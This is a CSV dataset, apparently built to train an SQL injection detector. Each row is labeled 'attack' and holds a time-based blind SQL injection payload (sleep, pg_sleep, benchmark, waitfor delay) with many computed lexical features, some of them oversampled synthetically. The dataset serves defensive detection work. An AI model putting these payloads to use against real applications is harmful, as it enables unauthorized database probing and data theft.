id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000304,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,1.6888361671861465,94.14824134373038,27.288944806238227,3.64359826987882,25.570351731253925,18.0,36.718593074984305,13.85929653749215,0.27192044871564,0.19131910083066486,0.3897268171075743,0.1470336333461209,3.4296482687460754,0.0,0.0,0.0,0.0,2.0,0.0,5.429648268746075,0.0,0.0,1.0,3.4296482687460754,1.0,0.0,0.0,0.5703517312539246,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.5703517312539246,0.4296482687460754,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000305,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000173,0.8627201183911032,78.0,17.794790539764588,2.7508337673071126,21.38437161929376,2.0,42.410418920470825,12.205209460235412,0.27415861050376616,0.025641025641025633,0.5437233194932157,0.15647704436199247,0.0,4.0,0.0,0.0,0.0,0.2052094602354132,0.0,8.0,0.0,0.0,0.0,0.20520946023541353,0.0,1.0,0.0,0.0,0.0,0.20520946023541342,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2052094602354133,0.7947905397645867,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000306,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,1.4406575003932363,68.78859807597,26.0,3.567111470415077,20.0,10.0,29.230878460775997,9.557719615194,0.2911284759881776,0.1455642379940888,0.4244442659752509,0.13886302004248272,0.4422803848060004,0.5577196151939996,2.0,0.0,0.0,1.0,0.0,4.557719615193999,0.0,0.9999999999999999,0.0,3.0,0.4422803848060004,0.5577196151939996,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000307,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000305,0.19996243077340636,62.2855271833825,16.228421746705997,2.855134756583027,21.771578253294003,1.0571054366764994,30.342632620058996,9.114210873352999,0.349917249318684,0.016912616728589416,0.4869228230481904,0.14624731090453622,0.0,3.0571054366764994,0.0,0.0,0.0,1.0,0.0,5.057105436676499,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9428945633235004,0.0,0.0,0.0,1.0,0.05710543667649953,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000308,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000303,1.3487951096410082,96.50869987476274,20.52609962428821,2.7588387348331596,27.508699874762737,2.0,53.0,14.0,0.28501936118541976,0.020724076487379117,0.5491880269155471,0.14506853541165396,0.0,1.0,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5086998747627375,0.4913001252372626,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000309,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.5345805762452903,57.426067965659946,19.426067965659946,3.3945631935585854,25.426067965659946,1.8579773447800179,22.142022655219982,8.0,0.4425830920763504,0.032471512491561744,0.38559116845117547,0.1393542269809124,0.0,3.8579773447800183,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.1420226552199813,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.14202265521998148,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8579773447800185,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000238,0.6161577616385215,77.47306177100076,19.245510295166792,2.946950634052518,27.0,2.0,38.98204118066717,9.491020590333585,0.34888115086376437,0.02584304821213068,0.5029940279898389,0.122281772934266,0.24551029516679268,0.0,0.0,0.0,1.0,0.0,0.0,8.245510295166792,0.0,0.0,0.0,1.0,0.24551029516679262,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000311,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000188,0.6250996618668417,62.157183213654044,23.694309928192425,3.507449497495946,20.462873285461615,10.0,25.347154964096212,6.347154964096212,0.3290444715169886,0.1612625647341167,0.4080459183718582,0.10164704537703642,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.115718321365404,0.0,0.9999999999999999,0.11571832136540433,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8842816786345956,0.0,0.0,0.8842816786345958,0.8842816786345957,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11571832136540433,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7685633572691914
SMOTE_000312,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.4045815950370464,58.938744195525004,18.861518271748213,3.3221481007951494,25.0,2.0,23.661780739021427,8.276963456503571,0.42662006303728073,0.03412960504298247,0.39883101799423554,0.14041931392550125,0.0,4.0,0.0,0.0,0.0,0.0,0.0,4.276963456503571,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000313,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000053,0.30247334028713435,93.73533860765582,23.1225564346093,2.912720525089306,30.0,2.0,49.49022573843721,12.245112869218605,0.3201846249343245,0.021345641662288306,0.5279199958617927,0.1305497375415945,0.12255643460930243,0.0,0.0,0.0,1.0,0.0,0.0,10.122556434609303,0.0,0.0,0.0,1.0,0.12255643460930238,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000314,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000101,1.2544231599055053,75.79629427550084,23.474536784437607,3.446868538958276,17.0,19.0,30.847220706625635,8.949073568875212,0.22490677036744544,0.2513663904106743,0.40602493943802465,0.11770189978385563,0.4745367844376057,0.0,0.0,0.0,0.0,1.0,0.0,5.474536784437606,0.0,0.0,1.0,1.0,0.47453678443760566,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000315,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,1.0620074854557227,76.5476795656896,26.377576956724116,3.5770945529464226,21.377576956724116,10.0,32.58505130448275,12.585051304482745,0.27905418060298115,0.13082759197239147,0.42588670568470516,0.1642315217399222,3.377576956724117,0.0,0.4149486955172552,0.0,0.0,1.7925256522413724,0.0,4.207474347758628,1.7925256522413724,0.9999999999999999,0.0,2.2074743477586276,1.0,0.0,0.2074743477586276,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7925256522413724,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7925256522413724
SMOTE_000316,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000007,0.32440370917745603,77.64907460508982,22.0,3.128048110640994,19.0,10.0,38.31925968407186,10.329814921017965,0.24491026356453757,0.12890013871817765,0.4932176698507372,0.1329719278665476,0.0,0.0,2.0,0.0,0.0,1.0,0.0,6.329814921017966,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000317,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000281,0.5953312442381692,62.83512521218178,18.505375636545335,3.122878059468365,25.34050084872711,1.0,28.329749575636445,8.164874787818222,0.40315880643960106,0.015915226520178752,0.4509448841075284,0.1299810829326917,0.0,3.0,0.0,0.0,0.0,0.16487478781822207,0.0,5.0,0.0,0.0,0.0,0.16487478781822196,0.0,1.0,0.0,0.0,0.0,0.16487478781822207,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000318,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000162,0.014941172004648064,88.0502791964676,27.004570836042507,3.8057700881882615,26.0,21.00457083604251,30.036566688340073,11.009141672085018,0.29530449275618026,0.23856133728718104,0.3411053136684915,0.12502885628814714,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.009141672085018,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0045708360425087,0.995429163957491,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000319,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000112,0.39039391119261796,93.09005164484044,22.181675274140073,2.8771643901752806,28.0,2.0,49.7267010965603,13.363350548280147,0.30096257253155145,0.021497326609396544,0.5340998192420547,0.14344028161699732,1.0,0.0,0.0,0.0,1.0,0.0,0.0,10.181675274140073,0.181675274140074,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000320,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000112,1.0079662679806705,94.53557415959511,21.58926235993252,2.8152009536189873,28.0,2.0,51.357049439730076,13.178524719865036,0.29647716364918286,0.02117694026065592,0.5431345151461737,0.1392113809439874,0.5892623599325181,0.0,0.0,0.0,1.0,0.0,0.0,10.589262359932517,0.0,0.0,0.0,1.0,0.5892623599325181,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000321,attack,time,1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000309,1.4831977629862922,79.53623031583575,22.9758464561095,3.1678086008301736,19.0,10.0,39.048307087781,11.48792322805475,0.2389698676795063,0.1257736145681612,0.49065011572665324,0.14460640202567926,0.48792322805475097,0.0,2.0,0.0,0.0,1.0,0.0,6.5120767719452495,0.48792322805475097,0.9999999999999999,0.0,3.0,0.487923228054751,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000322,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000049,0.6960839517722246,93.73437022066345,23.26562977933655,3.204419358979886,30.73437022066345,2.0,45.0,16.0,0.32787294942825407,0.021337366684817338,0.48009075040838994,0.17069893347853865,0.0,4.0,0.0,0.0,1.0,1.0,0.0,8.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.7343702206634508,0.26562977933654897,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000323,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000070,0.11288312850253487,55.41159968768394,22.97256002082107,3.787108624978249,23.109759916715717,4.0,17.274399791789293,11.02743997917893,0.41729090976691785,0.07229963668812057,0.3111934529500738,0.19921600059488775,6.0,0.0,0.0,0.0,0.0,0.9725600208210707,0.0,2.0548799583578585,0.0,0.0,0.0,0.9725600208210707,1.0,0.0,0.0,0.0,0.0,0.9725600208210707,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000324,attack,time,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000297,0.8426353159676861,91.52796182098913,28.631990455247283,3.808600396303831,20.0,29.0,32.527961820989134,10.0,0.2186106999613649,0.3169855149439791,0.35509843511397354,0.10930534998068245,0.36800954475271663,0.0,2.0,0.0,0.0,2.0,0.0,4.6319904552472835,0.0,0.0,1.0,4.0,0.3680095447527165,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000325,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000267,0.23027183680472965,78.80577920433255,26.0,3.507893052226817,16.0,21.0,32.97638217514219,8.829397029190366,0.20327183779634916,0.26679428710770825,0.4179304933328884,0.11200338176305415,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.829397029190365,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000326,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,1.0947221918927084,95.0,27.33810385264924,3.5770178147530376,33.00715577897386,10.0,39.66189614735076,12.33094807367538,0.3474437450418301,0.10526315789473684,0.4174936436563238,0.12979945340710927,0.0,4.0,0.0,0.0,0.0,1.33094807367538,0.0,6.0,0.0,0.9999999999999999,0.0,1.3309480736753803,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3309480736753798,0.66905192632462,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000327,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000091,0.4080673572785807,70.53920425662368,27.59559680753224,3.8308193610193824,16.13480106415592,20.73039787168816,24.53920425662368,9.13480106415592,0.22872756880018058,0.29417076479325754,0.3476454432055385,0.1294562232010234,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.13480106415592,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.8651989358440801,0.1348010641559198,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000328,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,1.4053975228378774,91.07881064122273,28.078810641222738,3.633116619722206,27.31524256489095,15.0,36.842378717554524,11.921189358777262,0.2994636698178819,0.1647122995630023,0.40479957361983343,0.13102445699928236,3.0,0.0,0.0,0.0,0.0,1.0,0.0,6.460594679388631,0.4605946793886312,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000329,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.11466532466362646,91.35935023103043,21.10267149458012,2.825652199923554,28.10267149458012,2.0,49.20534298916024,12.05133574729006,0.30761171782215063,0.021897432107864892,0.5385824232667741,0.1319084268032104,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.05133574729006,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9486642527099386,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.948664252709938
SMOTE_000330,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,nearest_attack_euclidean,R000272,0.9930235899193028,75.86208260716924,19.389166459191216,2.8935998425615383,22.91625031121318,2.0,39.55666583676486,11.389166459191214,0.3034492067383359,0.026413115707053347,0.5202622726194565,0.14987540493515417,4.0,0.0,0.0,0.0,0.0,0.0,0.0,7.389166459191214,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.6945832295956069,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.694583229595607
SMOTE_000331,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000208,0.031902073304316034,85.15940910931201,28.0,3.683649882413624,25.0,18.0,33.1275272874496,9.0318818218624,0.2935967022571503,0.2113896256251482,0.38896461683998956,0.10604905527771191,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.0318818218624015,0.0,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000332,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000287,0.25563121786841264,77.09737259190668,18.902627408093323,2.6574313354711396,18.097372591906677,2.0,44.0,13.0,0.23472277437936961,0.025941600868495965,0.5707152191069107,0.16862040564522363,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0973725919066777,0.9026274080933223,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000333,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000078,2.0130097643566587,61.373630394066225,22.927788796609274,3.4029459949547576,16.927788796609274,10.0,26.445841597456955,8.0,0.2748560462313911,0.1634651713685246,0.4309066453052646,0.13077213709481966,0.48194719915231843,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.5180528008476817,3.0,0.4819471991523185,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.48194719915231843,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4819471991523185
SMOTE_000334,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000116,1.6791731674722794,80.47770590023484,26.0,3.613990584147947,19.27149633135274,21.934713237529355,31.27149633135274,8.0,0.23752130795520895,0.27400373132749134,0.3880934996124634,0.10038146110483628,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.467356618764677,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5326433812353231,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.46735661876467705,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.467356618764677
